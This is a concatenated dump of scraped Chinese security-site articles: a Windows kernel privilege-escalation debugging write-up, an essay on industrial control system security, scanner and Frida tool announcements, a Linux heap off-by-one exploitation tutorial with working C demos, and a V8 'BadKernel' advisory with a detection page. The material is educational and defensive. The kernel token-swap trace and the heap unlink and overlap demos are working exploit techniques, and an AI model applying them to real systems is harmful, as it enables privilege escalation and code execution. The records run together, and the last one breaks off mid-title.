win32k!xxxMNMouseMove+0x194 (90669583)kd&gt; r eaxeax=00000000kd&gt; pwin32k!xxxMNMouseMove+0x152:90669541 53              push    ebx最后占位后就是处理后的ebx了，这时候我们对ebx后的值也很有讲究，ebx+0Ch的值就是我们最后要调用到的值，这个值刚开始我想是直接按照CVE-2014-4113中的值一样定义成0xfffffffb，但是后来发现，在HideNextHierarchy函数中会将这个值自加进行一个赋值。kd&gt; pwin32k!xxxMNHideNextHierarchy+0x2c:90648efa ff4004          inc     dword ptr [eax+4]kd&gt; dd eaxffffffff  ???????? fe7d2179 00000000 00000000因此，如果eax的值是0xfffffffb的话，加4之后就是0xffffffff，仍然是个无效地址，这个无效地址自加会导致系统异常，因此，我把eax的值设为0xffffffff，这样同样需要重新分配0页内存。kd&gt; pwin32k!xxxMNHideNextHierarchy+0x9:90648ed7 8b7508          mov     esi,dword ptr [ebp+8]kd&gt; pwin32k!xxxMNHideNextHierarchy+0xc:90648eda 8b460c          mov     eax,dword ptr [esi+0Ch]kd&gt; pwin32k!xxxMNHideNextHierarchy+0xf:90648edd 85c0            test    eax,eaxkd&gt; r eaxeax=ffffffff这样就绕过了最后一层判断，最后到达1E4的消息调用，这个地方传递的值就已经是0xffffffff了。kd&gt; pwin32k!xxxMNHideNextHierarchy+0x37:90648f05 6a00            push    0kd&gt; pwin32k!xxxMNHideNextHierarchy+0x39:90648f07 6a00            push    0kd&gt; pwin32k!xxxMNHideNextHierarchy+0x3b:90648f09 68e4010000      push    1E4hkd&gt; pwin32k!xxxMNHideNextHierarchy+0x40:90648f0e 50              push    eaxkd&gt; r @eax=ffffffffkd&gt; pwin32k!xxxMNHideNextHierarchy+0x41:90648f0f e88906faff      call    win32k!xxxSendMessage (905e959d)kd&gt; dd esp92dd3a3c  ffffffff 000001e4 00000000 00000000接下来向内层继续传递，和CVE-2014-4113的利用过程就基本一致了。kd&gt; pwin32k!xxxSendMessage+0x23:905e95c0 e882fdffff      call    win32k!xxxSendMessageTimeout (905e9347)kd&gt; dd esp92dd3a14  ffffffff 000001e4 00000000 00000000最后，执行到shellcodekd&gt; pwin32k!xxxSendMessageTimeout+0x1a9:905e94f0 ff5660          call    dword ptr [esi+60h]kd&gt; r esiesi=ffffffffkd&gt; dd esi+600000005f  00371410 00000000 00000000 00000000kd&gt; pBreakpoint 6 hit00371410 55              push    ebp下一个写入断点kd&gt; !process 0 0**** NT ACTIVE PROCESS DUMP ****PROCESS 841bdab0  SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000    DirBase: 00185000  ObjectTable: 87c01be8  HandleCount: 490.    Image: SystemPROCESS 845da8a8  SessionId: 1  Cid: 0ddc    Peb: 7ffdf000  ParentCid: 0cf8    DirBase: 3f321500  ObjectTable: 95b440f0  HandleCount:  28.    Image: EoP_1.exekd&gt; dd 845da8a8+f8845da9a0  86094613 000078da 00000000 00000000原进程tokenshellcode进行替换kd&gt; dd 845da8a8+f8 //提权Token845da9a0  87c01337 000078da 00000000 00000000kd&gt; dd 841bdab0+f8 //系统Token841bdba8  87c01337 00000000 00000000 00000000现在是system的token了，最后放一个提权后的截图后记这个漏洞总体来说可以算是CVE-2014-4113的进阶，和内核较劲的过程非常有意思，一步步的思考和绕过，让我想起以前膜拜大牛们过狗的案例中一步步bypass的过程，实际上二进制也是一样。那么这篇文章也写到这里，希望大牛们多多批评指正，也希望大家也都能有所收获，谢谢！","2016-11-15 13:43:38","网络安全","经典内核漏洞调试笔记之二","http://nsoad.com/Article/Network-security/20161115/775.html"
"5ccbfaf84f2f0a0a7a69c0f5","与国计民生息息相关的自动化领域正面临着诸如两化融合、工业4.0、智能制造等概念的不断冲击和洗礼，工业化和信息化的结合给封闭的工业控制系统打开了一扇天窗，在享受信息共","blackhold","与国计民生息息相关的自动化领域正面临着诸如两化融合、工业4.0、智能制造等概念的不断冲击和洗礼，工业化和信息化的结合给封闭的工业控制系统打开了一扇天窗，在享受信息共享与管理便利的同时，影响工业控制系统安全的潘多拉魔盒早已被悄然打开。传统信息系统固有的安全风险不可避免的被带入到了封闭、可靠的工业控制系统当中，这样一来，和工控系统相关的信息安全事件就一件接一件的发生了。0x01：愈演愈烈的工控安全事件早在21世纪初期，工控系统安全事件就已经在美国、俄罗斯等发达国家发酵。如2000年的GAzprom公司天然气输送管道网络SCADA系统任意控制事件；2003年美国俄亥俄州Davis-Besse的核电厂控制网络SQL SERVER蠕虫感染事件；2007年加拿大水利SCADA控制系统恶意入侵事件。这些攻击事件无不证实了工控系统的脆弱性和风险性。在我国，也曾出现过备受关注的工控系统信息安全事件，比如2003年，龙泉、政平、鹅城换流站控制系统发现病毒，原因是外国工程师在系统调试中用笔记本电脑上网引入了恶意代码，所幸并没有造成严重的后果。虽然工控安全事件时有发生，但并未真正引起人们的足够重视，这种形势一直延续到了2010年，Stunex震网病毒事件的发生给全世界的工控系统敲醒了警钟。2010年6月份首次被检测出来的Stunex病毒是一种专门定向攻击真实世界中核电站，水坝，国家电网等能源基础设施的“蠕虫”病毒。它的攻击给伊朗核电站中西门子公司的SIMATIC WinCC系统造成了巨大的破坏，最终使得伊朗核电站的离心机运行失控，同时掩盖发生故障的情况，“谎报军情”，以“正常运转”记录回传给管理部门，造成决策的误判。这种病毒可能给伊朗布什尔核电站造成严重影响，导致有毒的放射性物质泄漏，其危害甚至不亚于1986年发生的切尔诺贝利核电站事故，给伊朗的核设施造成了不可估量的影响。同时，该病毒还感染了全球超过 45000个网络，给很多国家和地区的基础设施带去了严重的安全隐患。这一年，工控系统信息安全被人们真正重视了起来，工控系统信息安全元年就此诞生，而这仅仅是个开始。在震网病毒之后，2011年的Duqu病毒，2012年的Flame病毒以及2014年的Havex病毒又席卷了全球工控网络，这些病毒以获取权限并搜集大量数据为目标，潜伏在数以万计的工控系统之中。大大小小的针对工控系统的攻击随着工控网络信息化的发展而愈演愈烈。在2015年12月份和2016年1月份发生的乌克兰电力系统攻击事件让工控安全彻彻底底的火了一把，这次攻击事件导致数以百万的居民在黑暗中度过了圣诞节，停电持续了十数个小时。和2010年发生的Stunex事件一样，这也是一次有组织有预谋的安全事件，攻击者通过鱼叉式钓鱼邮件植入的恶意代码直接对变电站系统的程序界面进行控制，控制远程设备的运行状态，直接切断供电线路，导致对应线路断电。这一事件的发生再一次加强了各国针对工控系统信息安全的重视程度，很多国家和地区都首次开展了针对能源等行业的工控系统的安全检查。持续发酵的工控安全事件让工控安全的影响上升到了一个前所未有的高度。0x02：工控系统生命周期的安全之觞如图1所示，工控系统生命周期一般包含七个阶段，分别是设计阶段、选型阶段、测试阶段、建设阶段、运行阶段、检修阶段以及废弃阶段。工控系统生命周期而在几乎已转入install base存量市场的自动化领域，工业控制系统在设计初期几乎没有考虑过信息安全的因素，选型阶段也不会囊括信息安全相关的装置设施。在整个工控系统的全生命周期，信息安全并没有作为不可缺少的一环贯穿其中，这直接导致了工控系统的脆弱性和风险性。在工控系统的全生命周期中，被重点考虑的安全环节主要是功能安全。随着工业生产过程的控制规模在不断扩大，复杂程度不断增加，工艺过程不断强化，对工业控制系统的要求也越来越高。在生产过程中，用于监视生产过程，在危险条件下采取相应措施防止危险事件发生的功能安全相关系统在工控系统的全生命周期中扮演了重要的角色，比如安全仪表系统就属于工厂控制系统中的报警和联锁部分，对控制系统中检测的结果实施报警动作或调节或停机控制。功能安全又比如盛有可燃性液体的容器内液位开关的动作，当液位到达潜在的危险值时，液位开关就会关闭阀门阻止更多的液体进入容器，从而阻止了液体从容器溢出，这一过程的正确执行就是功能安全的一种。在工控系统建设的各个阶段，功能安全都贯穿其中。然而，即使这样，工业安全事故仍然在不断发生。愈演愈烈的工业安全事件让工业信息安全逐步引起了关注。无论是震网病毒事件还是乌克兰电力系统攻击事件，都是融合了被攻击环境的业务场景的安全攻击。融合业务的攻击聚焦攻击者不仅掌握了信息安全的攻击技巧，更是对功能安全与业务场景了如指掌。工业控制系统，正面临着与业务融合的深度攻击的安全威胁，只考虑功能安全的工控系统已经很难在工业化和信息化融合的万花丛中做到片叶不沾身。未将信息安全融入工控系统全生命周期的工业设施必定存在安全之觞。0x03：工控系统的综合保障思考在当今的大时代背景下考虑工控安全，就是要把信息安全融入工控系统安全建设的全生命周期当中，贯穿始终。如图4所示，可以从四个维度、三个阶段将工控系统信息安全做深做精。安全理念层面，考虑从传统功能安全的安全监视向基于信息安全的安全防护体系进发，最终形成持续可运营的工控安全运营模式；安全防护层面，从边界安全向纵深防御领域迈进，最终形成基于设备本体的基因安全防护体系；安全需求层面，实现从最初的合规性需求满足到业务本体安全需求的进步；最后，在全生命周期中，将功能安全与信息安全进行全方位的深度融合。具体到全生命周期的每个阶段，可以得出如下建设思路。在工控系统的设计阶段将信息安全因素考虑其中，给出成型的系统建设信息安全解决方案；在设备选型阶段，选择成熟的融合信息安全的工业控制系统（DCS、PLC、RTU、IED等）和经过严格测试和认证的全线工控安全产品；在测试阶段通过漏洞检测与挖掘技术对已成型的系统进行严格的安全测试，通过渗透测试、漏洞扫描、漏洞挖掘等方式发现系统存在的安全隐患并进行加固和修复；在运行阶段通过非法入侵检测与异常行为安全审计等手段实现安全管理；在系统检修阶段继续通过漏洞扫描、漏洞挖掘等手段对系统进行二次安全测试；在废弃阶段对系统残余风险进行确认，确保系统正常报废无风险遗留。工控系统全生命周期安全建设0x04：工控安全与威胁情报的深度融合一切攻击皆有迹可循，针对工控系统的攻击也不例外。从关联角度分析，由于ERP系统和MES系统打通了连接，而MES系统又和生产控制系统有业务关联，因此传统信息系统的风险就被带入了生产控制系统。虽然目前工控安全产品众多，但真正能解决安全问题的适用性技术手段却少之又少。当前工控系统信息安全防护面临的困境主要有以下几点，如图6所示：图6 工控信息安全防护面临的困境基于以上几点分析，传统信息系统层面大有可为的威胁情报分析技术同样适用于工业控制系统安全领域，通过安全威胁情报技术建设安全威胁情报平台仍不失为一种有效的安全管理手段。一般而言，针对工控系统的入侵行为有以下几种特点：①在“企业阶段”，它在渗透到HMI之前会寻找一个目标HMI②在“工业阶段”，它感染了HMI，并寻找目标PLC，然后再变化，把恶意代码注入PLC中③ 在“运行阶段”，在注入指令破坏进程前，它会利用PLC寻找以特定参数运行的IED等被控设备有了攻击的行为特征，就有了判断攻击行为的依据，进而可以依托于威胁情报平台收集威胁情报数据。通过搭建好的企业威胁情报平台，可以实时爬去公网上存在的公网设备信息，如工控设备、服务器、DNS、路由器、智能设备等；可以实时判断公网上的应用信息，如WEB服务、FTP服务、TELNET服务、代理等服务；也可以将搭建好的蜜罐系统放置于公网，伪装成PLC等工控设备，接收Eripp、Shodan、Zoomeye等方式的探测，收集针对工控系统不同攻击手段的威胁情报。最终，将公网威胁情报与工控系统所在的生产控制网络的不同工控设备的安全行为等信息进行整合，形成内外结合的工控安全威胁情报体系。整体架构如图7所示：工控安全威胁情报体系架构通过工控安全预警平台对外部的威胁事件进行样本分析，将成型的情报信息推送到位于安全区的生产控制网络。即可通过主网络通道共享数据，也可通过私有加密协议进行数据传输，最终将情报数据从非安全区传入安全区，实现情报信息的共享，同时位于安全区的监测类装置可根据威胁报告进行规则和策略的调优处理。具体网络结构如图8所示：工控安全预警平台比如预警平台从生产控制网络的资产行为中建立了一组正常行为基线，即到一组PLC的Modbus所有通信都是来自于相同的3个HMI工作站，标记为基线A。在运营过程中发现监控系统报警，与基线A出现分歧，出现了第4个系统与PLC进行通信，判断其可能的表现有四种：一个新的未被授权的设备被插入网络中（如一台管理员的笔记本电脑）；一个使用欺诈IP地址的恶意HMI正在运行；新的系统安装上线。通过对近期公网的威胁情报及生产控制网络近期操作行为的整合分析，得知该异常是由于未被授权的设备接入网络所导致。0x05：前行中的工控安全之路基于全生命周期的工控系统安全综合保障手段的建设，给传统的单点安全防护提供了新的思路。将功能安全、信息安全、威胁情报进行深度融合的工控安全预警平台，连接了孤军奋战的单个结点，融入了故障诊断、异常告警、态势感知、攻击检测等持续可运营的安全防护理念，最大限度的保障工业控制系统稳定、高效、安全的运行。","2016-08-23 18:32:21","系统安全","工控系统的综合保障思考","http://nsoad.com/Article/system/20160823/327.html"
"5ccbfaf84f2f0a0a7a69c0f6","简介GourdScan最初是Matt（Cond0r）开发的一款被动式注入检测工具，GourdScan V2.0是一款基于代理和流量监听的被动式扫描器，是GourdScan的升级版，在原有的基础上增加了","silence","简介GourdScan最初是Matt（Cond0r）开发的一款被动式注入检测工具，GourdScan V2.0是一款基于代理和流量监听的被动式扫描器，是GourdScan的升级版，在原有的基础上增加了很多功能，也有了很大的改变。目前由range同学维护，支持扫描xpath，ldap，lfi，xss等漏洞。改进与第一版GourdScan比较：Diff用redis作为数据库而不是mysql。webui改为基于tornado，不再需要php环境。proxy改为http+https混合代理，大部分网站均可测试，远程代理需要设置ip为0.0.0.0。使用了python scapy模块指定网卡抓http包，可以有效通过混杂模式获取通过本机的流量并测试，而无需设置代理。增加规则，同时可以扫描xpath，ldap，lfi，xss等漏洞。相同用sqlmapapi进行sql注入检测。注意：不要在嗅探流量的同时，在本机开启sqlmap等程序，否则这些流量也会被加入到redis中形成死循环！！！具体的配置及注意事项请参考项目首页的README.MDTo Do优化测试url参数，更有效地减少重复。WEB界面持续升级。HTTP+HTTPS代理稳定性优化。scapy资源占用改进。伪静态的支持。不再使用sqlmapapi，替换成减少资源占用的弱规则扫描和强化扫描精度的强规则扫描及中等规则扫描。项目地址项目主页https://github.com/ysrc/GourdScanV2Docker Image链接: https://pan.baidu.com/s/1miLKhW8 密码: thrfdocker run -d -p 10022:22 -p 10086:10086 -p 10080:80 -p 16379:6379 ubuntu:14.04 /usr/sbin/sshd -DSSH密码：gourdscan_admin123~Redis：redis-server ~/GourdScan_v2/redis.conf使用Docker镜像的同学需要git pull 同步下最新代码。Thanks感谢项目中使用的sqlmap等开源项目、为本项目开发做出贡献的【|→上善若水】童鞋、mottoin网站和其他对本项目有帮助的朋友。如果在使用中发现有任何bug或建议，欢迎在github上提交issue。","2016-10-20 14:59:45","安全工具","GourdScan 分布式被动扫描器 v2.0 发布","http://nsoad.com/Security-tools/20161020/tools-612.html"
"5ccbfb024f2f0a0a7a69c0f7","对手机恶意软件研究人员来说，有很多APP行为分析工具可以选择，在这里，我要向大家推荐的是AppMon，它可以通过二进制指令获取app程序运行记录，并显示调用函数和相关参数。","Kender","对手机恶意软件研究人员来说，有很多APP行为分析工具可以选择，在这里，我要向大家推荐的是AppMon，它可以通过二进制指令获取app程序运行记录，并显示调用函数和相关参数。AppMon工作原理AppMon使用了多平台动态框架环境Frida，Frida是一款基于python + javascript 的hook框架，适应android\ios\linux\win\osx等平台的脚本交互环境。AppMon还包括了一系列app事件监控和行为修改脚本，并能通过web接口显示和操作。安装AppMon的运行环境需要Frida和其它模块：sudo -H pip install argparse frida flask termcolorLinux环境下可以克隆github安装：https://github.com/dpnishant/appmon/如果是Windows环境，下载解压之后，需要对appmon.py中变量merge_script_path的绝对路径进行修改，可以是临时文件夹或其它所需文件路径，如：merge_script_path = ‘C:/Users/&lt;nombre_usuario&gt;/AppData/Local/Temp/merged.js考虑到Frida的稳定性，推荐使用Android 4.4.x版本模拟器，另外，建议用adb命令安装apk程序。分析让我们来分析一个恶意程序样本Android/Torec.A，该程序可以实现窃取短信和通话记录等关键信息，并能利用 Tor网络的.onion代理服务器隐藏指令控制服务器，远程执行代码。程序Manifest文件显示包名为com.baseapp，现在开始启动AppMon控制端:Windows下的启动界面如下：AppMon创建了一个访问5000端口的简单服务器，实现web界面的分析显示：打开浏览器，选择需要分析的APK文件，点击“Next”：之后，将会显示apk程序执行阶段短暂的事件日志记录：我们再以Android/Monitor.Rasatremon.A为分析样本执行程序，通过web界面日志记录，可以看到具体的HTTP网络连接活动：除此之外，AppMon还有其它功能，如密码恢复等。总之，对apk分析来说，它是一款好用的工具。具体参见：https://dpnishant.github.io/appmon/","2016-11-22 14:31:08","安全工具","APK文件分析工具：AppMon","http://nsoad.com/Security-tools/20161122/tools-834.html"
"5ccbfb024f2f0a0a7a69c0f8","一个字节溢出被称为off-by-one，曾经的一段时间里，off-by-one被认为是不可以利用的，但是后来研究发现在堆上哪怕只有一个字节的溢出也会导致任意代码的执行。同时堆的off-","Kong","一个字节溢出被称为off-by-one，曾经的一段时间里，off-by-one被认为是不可以利用的，但是后来研究发现在堆上哪怕只有一个字节的溢出也会导致任意代码的执行。同时堆的off-by-one利用也出现在国内外的各类CTF竞赛中，但是在网络上还不能找到一篇系统的介绍堆off-by-one利用的教程。在这篇文章中我列出了5种常见的堆上的off-by-one攻击方式，并且给出了测试DEMO，测试的环境均为x86。0x01 背景知识网络上关于Linux下堆管理机制的文章已经有很多了，这里不再详细的描述堆管理机制的细节，仅简单的列出一些要理解文章内容必须要掌握的基础知识点。首先，目前的Linux使用的是基于ptmalloc的堆管理器。在ptmalloc中堆块被分为以下四种类型1.fastbinfastbin的范围处于16～64byte，使用单向链表来维护。每次从fastbin中分配堆块时，都会从尾部取出。fastbin块的inuse位永远是置于1的，并且享有最高的优先权，在分配和释放时总会最先考虑fastbin。2.unsort binunsort bin在bins[]中仅占有一个位置，除了fastbin外的其他块被释放后都会进入到这里来作为一个缓冲，每当进行malloc时会把堆块从unsort bin中取出并放到对于的bins[]中。3.small binsmall bin是指大于16byte且小于512byte的堆块，使用双向链表链接，不会有两个相邻的空的small bin块，因为一旦出现这种情况，相邻的块就会被合并成一个块。通常是在调用free函数时触发这一过程。需要注意的是在相邻空块合并时会调用unlink()宏来进行取下操作，但是调用malloc()时的取下操作却没有使用unlink宏。4.large bin超出large bin范围的即为large bin，large bin相比其他块而言具有一条额外的由fd_nextsize和bk_nextsize域组成的链表结构。如图所示，其中size域低三位作为标志位，我们最需要记住的就是inuse位，这个位确定了前一个块是否处于使用状态。是的，在ptmalloc中一个块是否使用是由下一个块进行记录的。0x02 off-by-one的分类off-by-one总共可以分为两种利用方式chunk overlappingoff-by-one overwrite allocatedoff-by-one overwrite freedoff-by-one null byteunlinkoff-by-one small binoff-by-one large bin这种划分的依据是基于利用的思路不同。第一种的利用的核心思路主要是为了进行chunk overlapping,而第二种的利用思路则是想要触发unlink。0x03 达成漏洞利用的条件off-by-one并不是全都可以达到利用的目的的。首先就要求堆必须以要求的size+0x4字节（x86）的大小进行分配。如果不满足这个条件那么就无法覆盖到inuse位了。这个是由于堆的字节对齐机制造成的，简单的说堆块是以8字节进行对齐的（x64为16字节）。如果malloc(1024)，那么实际会分配1024+8=1032字节，这一点很好理解。但是如果是malloc(1020)呢，1020+8=1028字节，而1028不满足8字节对齐，那么实际只会分配1020+4=1024字节，多出的4个字节由下一块的prev_size提供空间。而对于触发unlink的操作来说，还需要一个额外的附加条件。因为现在的unlink是有检验的，所以需要一个指向堆上的指针才可以。0x04 漏洞利用的效果off-by-one能达到什么利用效果呢？这个是很关键的问题。根据分类来看可以实现两种效果1.chunk overlapping所谓的chunk overlapping是指，针对一个目标堆块。我们可以通过一些操作，使这个目标堆块被我们重新分配到某个我们控制的新的堆块中，这样就可以对目标堆块进行任意的读写了。2.unlink这种off-by-one造成的unlink的利用效果其实和溢出造成的unlink的利用效果是一致的。对于small bin可以使指向堆的指针ptr的值变为&amp;ptr-0xc，这样再结合一系列的操作就可以达成几乎无限次的write-anything-anywhere了。而large bin的unlink则可以实现一次任意地址写（write-anything-anywhere）。0x05 漏洞利用的原理chunk overlapping的原理在于ptmalloc的堆块验证机制的不完善，通过一些ptmalloc定义的宏就可以看出这一点。inuse()：仅通过下一块的inuse位来判定当前块是否使用.prev_chunk()：如果前一个块为空，那么进行空块合并时，仅使用本块的prev_size来寻找前块的头。next_chunk()：仅通过本块头+本块大小的方式来寻找下一块的头chunksize()：仅通过本块的size确定本块的大小。unlink的原理在于unlink宏在处理时会互写数据造成任意地址写。经过改进后的unlink宏增加了check，但是可以通过一个指向堆上的指针导致绕过情况。0x06 达成漏洞利用的具体操作off-by-one overwrite allocated在这种情况下堆块布局是这样的A是发生有off-by-one的堆块，其中B和C是allocated状态的块。而且C是我们的攻击目标块。我们的目标是能够读写块C，那么就应该去构造出这样的内存布局。然后通过off-by-one去改写块B的size域（注意要保证inuse域的值为1，否则会触发unlink导致crash）以实现把C块给整个包含进来。通过把B给free掉，然后再allocated一个大于B+C的块就可以返回B的地址，并且可以读写块C了。具体的操作是：1. 构成图示的内存布局2. off-by-one改写B块的size域(增加大小以包含C，inuse位保持1)3. free掉B块4. malloc一个B+C大小的块5. 通过返回的地址即可对C任意读写 注意，必须要把C块整个包含进来，否则free时会触发check，导致抛出错误。因为ptmalloc实现时的验证逻辑是当前块的下一块的inuse必须为1，否则在free时会触发异常，这一点本来是为了防止块被double free而做的限制，却给我们伪造堆块造成了障碍。off-by-one overwrite freed在这种情况下堆块布局依然是这样的http://p2.qhimg.com/t010c5431ea156fa6ad.pngA是发生有off-by-one的堆块，其中B是free状态的块,C是allocated块。而且C是我们的攻击目标块。我们的目标是能够读写块C，那么就应该去构造出这样的内存布局。然后通过off-by-one去改写块B的size域（注意要保证inuse域的值为1）以实现把C块给整个包含进来。但是这种情况下的B是free状态的,通过增大B块包含C块，然后再allocated一个B+C尺寸的堆块就可以返回B的地址，并且可以读写块C了。具体的操作是：1. 构成图示的内存布局2. off-by-one改写B块的size域(增加大小以包含C，inuse位保持1)3. malloc一个B+C大小的块4. 通过返回的地址即可对C任意读写off-by-one null byte这种情况就与上面两种有所不同了，在这种情况下溢出的这个字节是一个'\x00'字节。这种off-by-one可能是最为常见的，因为诸如:buf=malloc(124);if(strlen(str)==124){   strcpy(buf,str);}就会产生这种null byte off-by-one，即拷贝一个字符串到一个同样长的缓冲区时，并未考虑到NULL字节。相比于前两种，这种利用方式就显得更复杂，而且对内存布局的要求也更高了。首先内存布局需要三个块其中A,B,C都是allocated块，A块发生了null byte off-by-one,覆盖了B块的inuse位，使B块伪造为空。然后在分配两个稍小的块b1、b2，根据ptmalloc的实现，这两个较小块（不能是fastbin）会分配在B块中。然后只要释放掉b1，再释放掉C，就会引发从原B块到C的合并。那么只要重新分配原B大小的chunk，就会重新得到b2。在这个例子中，b2是我们要进行读写的目标堆块。最后的堆块布局如下所示：布局堆块结构如ABC所示1. off-by-one覆盖B，目的是覆盖掉B的inuse位2. free B3. malloc b1,malloc b24. free C5. free b16. malloc B7. overlapping b2这种利用方式成功的原因有两点:通过prev_chunk()宏查找前块时没有对size域进行验证当B块的size域被伪造后，下一块的pre_size域无法得到更新。off-by-one small bin这种方法是要触发unlink宏，因此需要一个指向堆上的指针来绕过fd和bk链表的check。需要在A块上构造一个伪堆结构，然后覆盖B的pre_size域和inuse域。这样当我们free B时，就会触发unlink宏导致指向堆上的指针ptr的值被改成&amp;ptr-0xC(x64下为&amp;ptr-0x18)。通过这个特点，我们可以覆写ptr指针，如果条件允许的话，几乎可以造成无限次的write-anything-anywhere。1. 在A块中构造伪small bin结构，并且修改B块的prev_size域和inuse域。2. free B块3. ptr指针被改为&amp;ptr-0xCoff-by-one large binlarge bin通过unlink造成write-anything-anywhere的利用方法最早出现于Google的Project Zero项目的一篇文章中，具体链接是https://googleprojectzero.blogspot.fr/2014/08/the-poisoned-nul-byte-2014-edition.html在这篇文章中，提出了large bin检验仅仅是通过assert断言的形式来进行的，并不能真正的对漏洞进行有效的防护。但是经过我的测试发现，目前版本的ubuntu和CentOS已经均具备有检测large unlink的能力，如果发现存在指针被篡改的情况，则会抛出“corrupted double-linked list(not small)”的错误，之后翻阅了一下glibc中ptmalloc部分的实现代码却并没有发现有检测这部分的代码，猜测大概是后续版本中加入的。因为这种利用方式的意义已经不是很大，这里就不在详细列出步骤也不提供测试DEMO了。 0x07 测试DEMO1.off-by-one overwrite allocatedint main(void){    char buf[253]="""";    void *A,*B,*C;    void *Overlapped;         A=malloc(252);    B=malloc(252);    C=malloc(128);    memset(buf,'a',252);    buf[252]='\x89';  //把C块包含进来    memcpy(A,buf,253);//A存在off-by-one漏洞         free(B);    Overlapped=malloc(500);}这段代码演示了通过off-by-one对C块实施了overlapping。通过返回的变量Overlapped就可以对C块进行任意的读写了。2.off-by-one overwrite freedint main(void){    char buf[253]="""";    void *A,*B,*C;    void *Overlapped;         A=malloc(252);    B=malloc(252);    C=malloc(128);    free(B);    memset(buf,'a',252);    buf[252]='\x89';    memcpy(A,buf,253);//A存在off-by-one漏洞       Overlapped=malloc(380);}这个DEMO与上面的类似，同样可以overlapping后面的块C，导致可以对C进行任意读写。3.off-by-one null byteint main(void){    void *A,*B,*C;    void *B1,*B2;    void *Overlapping;    A=malloc(0x100);    B=malloc(0x208);    C=malloc(0x100);    free(B);    ((char *)A)[0x104]='\x00';    B1=malloc(0x100);    B2=malloc(0x80);    free(B1);    free(C);    malloc(0x200);   }可以成功的对B2进行任意读写。4.off-by-one small bin29void *ptr;int main(void){    int prev_size,size,fd,bk;    void *p1,*p2;    char buf[253]="""";       p1=malloc(252);    p2=malloc(252);       ptr=p1;    prev_size=0;    size=249;    fd=(int)(&amp;ptr)-0xC;    bk=(int)(&amp;ptr)-0x8;         memset(buf,'c',253);    memcpy(buf,&amp;prev_size,4);    memcpy(buf+4,&amp;size,4);    memcpy(buf+8,&amp;fd,4);    memcpy(buf+12,&amp;bk,4);    size=248;    memcpy(&amp;buf[248],&amp;size,4);    buf[252]='\x00';         memcpy(p1,buf,253);         free(p2);}这个DEMO中使用了一个指向堆上的指针ptr，ptr是全局变量处于bss段上。通过重复写ptr值即可实现write-anything-anywhere。0x08 后记这是本人第一次投稿原创文章，之前只是写写博客。文笔不好，错误也在所难免，希望大家包容下。","2016-10-19 17:08:11","Web安全","从一字节溢出到任意代码执行-Linux下堆漏洞利用","http://nsoad.com/Article/web/20161019/601.html"
"5ccbfb024f2f0a0a7a69c0f9","通常情况下，网络犯罪分子在通过技术支持服务来进行诈骗活动时，需要使用到一些钓鱼网站，并在钓鱼页面中包含一些伪造的警告信息。诈骗分子需要通过这些警告信息来欺骗用户","blackhold","Google Chrome V8引擎3.20至4.2版本中存在远程代码执行漏洞，该漏洞是由于源代码中“observe_accept_invalid”异常类型被误写为“observe_invalid_accept”。攻击者可利用该漏洞造成kMessages关键对象信息泄露，执行任意代码。基于Android 4.4.4至5.1版本系统的WebView控件开发的手机APP均可能受上述漏洞影响。其中的漏洞信息列表如下：CNNVD_ID            级别    描述CNNVD-201608-414    严重    源代码中“observe_accept_invalid”异常类型被误写导致远程代码执行详情见如下地址：http://www.cnnvd.org.cn/vulnerability/show/cv_cnnvdid/CNNVD-201608-414文章目录    什么是Google Chrome V8引擎?影响的版本不受影响的版本漏洞分析检测方法防护方案声 明什么是Google Chrome V8引擎?Google V8 JavaScript Engine是美国谷歌（Google）公司为Chrome浏览器开发的一套开源JavaScript引擎。V8在运行之前将JavaScript编译成了机器码，而非字节码或是解释执行它，以此提升性能。更进一步，使用了如内联缓存（inline caching）等方法来提高性能。有了这些功能，JavaScript程序与V8引擎的速度媲美二进制编译。影响的版本Google Chrome JavaScript V8 引擎 3.20-4.2。Android 4.4.4-5.1上使用WebView控件所开发的APP。不受影响的版本Google Chrome JavaScript V8引擎 &gt; 4.2。漏洞分析V8是一个Google开发的开源高性能JavaScript引擎。V8其内置机制将底层native的对象或代码暴露给上层JavaScript代码，供其访问调用，从而提供效率。本次BadKernel漏洞，存在于ConvertAcceptListToTypeMap函数。该函数代码见以下地址：http://androidxref.com/5.0.0_r2/xref/external/chromium_org/v8/src/object-observe.js#ConvertAcceptListToTypeMap。在MakeTypeError时，作者错误使用“observe_accept_invalid”。在http://androidxref.com/5.0.0_r2/xref/external/chromium_org/v8/src/messages.js#75中可以看到并没有定义“observe_accept_invalid”，而是定义了“observe_invalid_accept”。因此，攻击者可以通过精巧的内存控制，通过此漏洞调用对象的observe方法实现信息泄露，进而实现任意代码执行。此漏洞的调用流程：1.JavaScript代码调用对象的observe方法，Object.observe()2.http://androidxref.com/5.0.0_r2/xref/external/chromium_org/v8/src/bootstrapper.cc#16333.http://androidxref.com/5.0.0_r2/xref/external/chromium_org/v8/src/object-observe.js#3754.http://androidxref.com/5.0.0_r2/xref/external/chromium_org/v8/src/object-observe.js#ConvertAcceptListToTypeMap5.http://androidxref.com/5.0.0_r2/xref/external/chromium_org/v8/src/messages.js#3236.http://androidxref.com/5.0.0_r2/xref/external/chromium_org/v8/src/messages.js#MakeGenericError7.http://androidxref.com/5.0.0_r2/xref/external/chromium_org/v8/src/messages.js#FormatMessage检测方法用户可以通过访问包含如下JavaScript代码的html页面，判断自身的V8版本是否存在此漏洞。&lt;html&gt;&lt;title&gt;BadKernel Test&lt;/title&gt;&lt;script&gt;var kMessages;Object.prototype.__defineGetter__(""observe_accept_invalid"",function()   {kMessages=this});try{Object.observe({},function(){},1)}catch(e){}delete Object.prototype[""observe_accept_invalid""];if(!kMessages)alert('badKernel vulnerability not exists.');elsealert('badKernel vulnerability exists!');&lt;/script&gt;&lt;/html&gt; 防护方案1.受影响的厂商，尽快升级V8版本至4.2以上版本。2.对于暂时因各种原因无法升级的厂商，将ConvertAcceptListToTypeMap函数中observe_accept_invalid修改为observe_invalid_accept，并重新编译V8至自身APP内，推送APP升级。3．绿盟科技免费检测。请用安卓手机端安装的各浏览器逐一访问如下链接或扫描二维码进行漏洞检测。https://cloud.nsfocus.com/krosa/views/weixin_h5/webkitloophole.html声 明本安全公告仅用来描述可能存在的安全问题，绿盟科技不为此安全公告提供任何保证或承诺。由于传播、利用此安全公告所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，绿盟科技以及安全公告作者不为此承担任何责任。绿盟科技拥有对此安全公告的修改和解释权。如欲转载或传播此安全公告，必须保证此安全公告的完整性，包括版权声明等全部内容。未经绿盟科技允许，不得任意修改或者增减此安全公告内容，不得以任何方式将其用于商业目的。","2016-08-28 20:07:01","Web安全","Google Chrome 